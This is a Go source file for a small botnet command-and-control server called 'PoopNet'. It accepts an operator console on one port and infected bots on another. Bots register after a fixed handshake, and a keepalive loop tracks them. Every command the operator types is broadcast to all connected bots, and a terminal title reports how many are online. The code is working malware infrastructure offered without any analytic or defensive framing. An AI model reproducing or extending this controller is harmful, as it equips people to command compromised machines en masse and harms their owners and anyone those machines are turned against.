package main

import (
	"bufio"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

const (
	SERVER_IP   = "127.0.0.1"
	SERVER_PORT = "12345"
	BOT_PORT    = "54321"
)

var (
	botList *BotList = NewBotList()
)

type Server struct {
	Conn net.Conn
}

type Bot struct {
	Id   int
	Conn net.Conn
}

type BotList struct {
	Id          int
	Bots        map[int]*Bot
	AddChan     chan (*Bot)
	RemoveChann chan (*Bot)
	CmdChan     chan string
}

func main() {
	serverListener, err := net.Listen("tcp", net.JoinHostPort(SERVER_IP, SERVER_PORT))
	if err != nil {
		panic(err)
	}
	botListener, err := net.Listen("tcp", net.JoinHostPort(SERVER_IP, BOT_PORT))
	if err != nil {
		panic(err)
	}
	go func() {
		for {
			conn, err := botListener.Accept()
			if err != nil {
				panic(err)
			}
			bot := NewBot(conn)
			go bot.Handle()
		}
	}()
	for {
		conn, err := serverListener.Accept()
		if err != nil {
			panic(err)
		}
		server := NewServer(conn)
		go server.Handle()
	}
}

func NewServer(conn net.Conn) *Server {
	return &Server{
		Conn: conn,
	}
}

func NewBot(conn net.Conn) *Bot {
	return &Bot{
		Id:   -1,
		Conn: conn,
	}
}

func NewBotList() *BotList {
	botList := &BotList{
		Id:          0,
		Bots:        make(map[int]*Bot),
		AddChan:     make(chan *Bot),
		RemoveChann: make(chan *Bot),
		CmdChan:     make(chan string),
	}
	go botList.Manager()
	return botList
}

func (list *BotList) AddBot(bot *Bot) {
	list.AddChan <- bot
}

func (list *BotList) RemoveBot(bot *Bot) {
	list.RemoveChann <- bot
}

func (list *BotList) SendCmd(command string) {
	list.CmdChan <- command
}

func (list *BotList) Manager() {
	for {
		select {
		case bot := <-list.AddChan:
			list.Id++
			bot.Id = list.Id
			list.Bots[bot.Id] = bot
			break
		case bot := <-list.RemoveChann:
			delete(list.Bots, bot.Id)
			break
		case command := <-list.CmdChan:
			for _, bot := range list.Bots {
				bot.Send(command)
			}
			break
		}
	}
}

func (server *Server) ReadLine() (string, error) {
	reader := bufio.NewReader(server.Conn)
	data, err := reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	data = strings.TrimSpace(data)
	data = strings.Replace(data, "\x00", "", -1)
	return data, nil
}

func (server *Server) WriteString(data string) {
	server.Conn.Write([]byte(data))
}

func (server *Server) ShowBot() {
	for {
		server.WriteString("\033]0;Connected: " + strconv.Itoa(len(botList.Bots)) + "\007")
		time.Sleep(1 * time.Second)
	}
}

func (server *Server) Handle() {
	defer server.Conn.Close()
	go server.ShowBot()
	for {
		server.WriteString("sussy_baka@PoopNet~# ")
		command, err := server.ReadLine()
		if err != nil {
			fmt.Println("Someone left the botnet.")
			break
		}
		if command == "" {
			continue
		}
		if command == "test" {
			fmt.Println("Fine!")
			continue
		}
		botList.SendCmd(command)
	}
}

func (bot *Bot) Send(data string) {
	bot.Conn.Write([]byte(data))
}

func (bot *Bot) Recv(size int) (string, error) {
	buffer := make([]byte, size)
	if _, err := bot.Conn.Read(buffer); err != nil {
		return "", err
	}
	data := string(buffer)
	data = strings.TrimSpace(data)
	data = strings.Replace(data, "\x00", "", -1)
	return data, nil
}

func (bot *Bot) Handle() {
	verifyMsg, err := bot.Recv(1024)
	if err != nil || verifyMsg != "0x00" {
		return
	}
	botList.AddBot(bot)
	defer botList.RemoveBot(bot)
	for {
		bot.Send("0x01")
		keepAlive, err := bot.Recv(1024)
		if err != nil || keepAlive != "0x02" {
			break
		}
		time.Sleep(5 * time.Second)
	}
}
